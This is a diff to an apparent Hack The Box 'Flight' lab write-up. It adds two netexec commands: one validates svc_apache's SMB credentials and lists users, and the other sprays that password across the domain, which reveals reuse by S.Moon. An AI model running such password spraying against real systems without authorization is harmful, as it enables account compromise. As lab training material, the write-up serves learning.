@@ -67,13 +67,13 @@
 
 9. Check credentials work with netexec and enumerate users with SMB login
 
-``
+`nxc smb flight.htb -u svc_apache -p $(cat ../user/svc_apache.pass) --users`
 
 <img width="834" height="604" alt="image" src="https://github.com/user-attachments/assets/c6b2e79f-0067-4944-8c69-fd257fd892e6" />
 
 10. With the users list, we do a password spraying attack with svc_apache's password to see if there's any password reuse on the domain. And we find the user S.Moon has the same password!
 
-``
+`nxc smb flight.htb -u usernames.list -p $(cat ../user/svc_apache.pass) --continue-on-success`
 
 <img width="899" height="317" alt="image" src="https://github.com/user-attachments/assets/10f40940-27d3-4319-b605-f16189875589" />
 
